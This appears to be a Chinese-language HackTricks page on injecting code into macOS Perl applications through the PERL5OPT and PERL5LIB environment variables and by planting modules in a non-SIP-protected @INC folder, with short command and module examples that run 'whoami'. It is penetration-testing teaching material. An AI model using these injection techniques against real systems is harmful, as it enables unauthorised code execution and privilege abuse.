# macOS Perl 应用程序注入

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

- 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
- 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏
- **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上关注**我们。
- 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 通过 `PERL5OPT` 和 `PERL5LIB` 环境变量

使用环境变量 PERL5OPT 可以使 perl 执行任意命令。\
例如，创建此脚本：

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

现在**导出环境变量**并执行**perl**脚本：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
另一个选项是创建一个Perl模块（例如 `/tmp/pmod.pm`）：

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

然后使用环境变量：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 通过依赖项

可以列出运行 Perl 时的依赖项文件夹顺序：
```bash
perl -e 'print join("\n", @INC)'
```
这将返回类似以下内容：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
一些返回的文件夹甚至不存在，然而，**`/Library/Perl/5.30`** 确实存在，它没有受到 **SIP** 保护，并且位于受 **SIP** 保护的文件夹之前。因此，有人可以滥用该文件夹，在其中添加脚本依赖项，以便高权限的 Perl 脚本加载它。

{% hint style="warning" %}
但请注意，您需要是 root 用户才能在该文件夹中写入，并且现在您将会收到这个 **TCC 提示**：
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

例如，如果一个脚本导入 **`use File::Basename;`**，那么可以创建 `/Library/Perl/5.30/File/Basename.pm` 来执行任意代码。

## 参考资料

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
